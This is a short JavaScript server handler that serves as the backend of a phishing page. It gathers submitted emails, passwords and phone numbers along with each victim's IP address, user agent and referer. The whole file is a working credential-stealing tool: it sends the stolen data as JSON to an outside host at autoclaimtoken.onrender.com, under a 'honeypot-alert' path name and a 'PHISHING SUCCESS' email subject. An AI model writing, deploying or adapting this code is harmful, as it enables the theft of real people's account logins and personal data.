export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const phishingData = {
      type: 'PHISHING_CREDENTIALS',
      timestamp: new Date().toISOString(),
      credentials: {},
      metadata: {}
    };

    // Extract form data
    if (req.body.email) phishingData.credentials.email = req.body.email;
    if (req.body.password) phishingData.credentials.password = req.body.password;
    if (req.body.phone) phishingData.credentials.phone = req.body.phone;

    // Get IP and user agent
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
    
    phishingData.metadata = {
      ip: ip,
      userAgent: req.headers['user-agent'],
      referer: req.headers.referer,
      timestamp: new Date().toISOString()
    };

    // Send to admin alert system
    try {
      await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...phishingData,
          alertType: 'PHISHING_CREDENTIALS_COLLECTED',
          priority: 'CRITICAL',
          emailSubject: `🎣 PHISHING SUCCESS - ${phishingData.credentials.email}`,
          adminEmail: true
        })
      });
    } catch (error) {
      console.log('Alert system unavailable');
    }

    res.status(200).json({
      success: true,
      message: 'Credentials collected'
    });

  } catch (error) {
    console.error('Phishing collection error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process credentials'
    });
  }
}